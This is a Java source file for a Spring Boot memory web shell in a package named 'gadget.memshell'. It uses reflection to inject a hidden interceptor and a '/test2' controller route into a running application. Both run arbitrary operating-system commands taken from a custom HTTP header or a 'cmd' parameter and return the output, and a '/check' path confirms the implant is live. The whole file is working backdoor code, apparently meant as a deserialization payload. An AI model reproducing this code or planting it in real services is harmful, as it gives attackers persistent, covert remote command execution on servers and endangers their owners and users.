package gadget.memshell;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
public class SpringBootMemoryShellOfIntecepter extends HandlerInterceptorAdapter {
    public SpringBootMemoryShellOfIntecepter(int aaa) throws NoSuchMethodException ,NoSuchFieldException, ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        if(aaa != 111){
            inject();
            injectInterceptor();
//            System.out.println("Inject ok");
        }
    }

    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getHeader("squirt1e");
        System.out.println(request.getRequestURI());
        if(request.getRequestURI().equals("/check")){
            java.io.PrintWriter printWriter = response.getWriter();
            printWriter.write("Interceptor inject ok!");
            printWriter.flush();
            printWriter.close();
        }

        if(cmd != null){
            try {
                String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                response.getWriter().println(res);
            }catch (Exception e){
            }
            return false;
        }
        return true;
    }
    public void test() throws Exception {
        HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getResponse();
        Runtime.getRuntime().exec(request.getParameter("cmd"));
        response.getWriter().write("ok");
    }
    public static String inject() throws NoSuchMethodException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
        configField.setAccessible(true);
        RequestMappingInfo.BuilderConfiguration config =
                (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
        Method method2 = SpringBootMemoryShellOfIntecepter.class.getMethod("test");
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        RequestMappingInfo info = RequestMappingInfo.paths("/test2")
                .options(config)
                .build();
        SpringBootMemoryShellOfIntecepter springControllerMemShell = new SpringBootMemoryShellOfIntecepter(111);
        mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);
        return "ok";
    }

    public static String injectInterceptor(){
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(requestMappingHandlerMapping);
            SpringBootMemoryShellOfIntecepter vulInterceptor = new SpringBootMemoryShellOfIntecepter(111);
            adaptedInterceptors.add(vulInterceptor);
            return "inject ok...";
        }catch (Exception ex)
        {
            return "inject fail...";
        }
    }
}